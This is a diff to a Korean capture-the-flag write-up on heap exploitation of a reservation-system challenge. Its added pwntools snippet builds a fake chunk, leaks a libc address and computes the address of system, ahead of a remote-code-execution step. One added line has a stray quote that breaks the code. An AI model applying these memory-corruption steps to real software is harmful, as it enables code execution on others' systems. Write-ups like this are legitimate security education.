@@ -159,6 +159,7 @@ xxxxxxxx xxxxxxxx   <- 여기로 가짜 청크가 들어오게 되면, reservati
 xxxxxxxx aaaaaaaa   <- aaaaaaaa 자리는 원래 0x21이어야 함
 [  fd  ] [  bk  ]   <- leak!
 """
+```
 
 
 heap overflow를 쉽게 사용하기 위해서 아래같은 헬퍼 함수를 만들어 두었다.
@@ -226,7 +227,7 @@ for _ in trange(256):
 {: .file="exploit_front" }
 
 > `create_reserv(6, b"\x00" * 0x8 + p64(0x21), p64(0))` 부분은 이후 libc를 leak하기 위해 또다른 fake chunk를 만드는 부분이다.
-> 이때부터는 이미 AAW이 가능하기 때문에 정확하게 이 위치를 청크로 사용할 수 있다.
+> 이걸 사용하는 시점부터는 이미 AAW이 가능하기 때문에 정확하게 이 위치를 청크로 사용할 수 있다.
 {: .prompt-info}
 
 
@@ -266,6 +267,21 @@ edit_reserv(4, p64(1), p64(ptr))
 edit_reserv(1, data, p64(0))
 ```
 이런식으로 해주면 된다.
+
+조금만 더 작업해서 미리 만들어두었던 가짜 청크에 힙을 할당해서 릭을 해주기만 하면,
+
+```python
+        cancel_reserv(2)  # heap+0x3a0
+
+        edit_reserv(4, p64(1), p64(heap_base + 0x3A0))
+        edit_reserv(1, p64(safelink(heap_base + 0x420)), p64(2))
+        create_reserv(2, b"a", b"a")
+        create_reserv(3, b"L" * 0x10, b"L" * 8)
+        p.recvuntil(b"LLLLLLLL")
+        leak = u64(p.recvuntil(b"\x0a", drop=True).ljust(8, b"\x00"))
+        libc = leak - 0x21ACE0'
+        system = libc + le.symbols["system"]
+```
 
 마지막 RCE만 남았다.<br>
 처음에는 `__run_exit_handlers`를 이용하려고 했으나, 문제는 `sys_exit`이 호출되면서 프로그램이 종료된다는 점이었다.
